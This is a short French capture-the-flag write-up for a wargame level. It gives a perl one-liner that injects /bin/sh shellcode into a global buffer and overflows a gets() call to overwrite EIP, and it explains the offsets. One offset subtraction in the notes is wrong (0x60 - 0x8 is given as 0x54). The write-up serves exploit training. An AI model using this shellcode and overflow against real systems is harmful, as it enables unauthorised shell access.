(perl -e 'print "dat_wil" . "\x90"x8 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" . "\n"' ; perl -e 'print "\x90"x80 . "\x48\xa0\x04\x08" . "\n"' ; cat) | ./level01

Cet exercice porte a confusion avec son entree de mot de passe et d'utilisateur, mais ce sont juste des facon d'injecter du shellcode.
On trouve eip en regardant gets et le retour de ltrace ainsi que la variable globale a_user_name

0x0804a040  a_user_name
La taille du deuxieme buffer nous laisse override eip en faisant :
0x60 - 0x8 = 0x54
Il faut donc un padding de 0x50 puis notre adresse pointant vers 0x0804a040 + 8 pour eviter l'entree du nom d'utilisateur.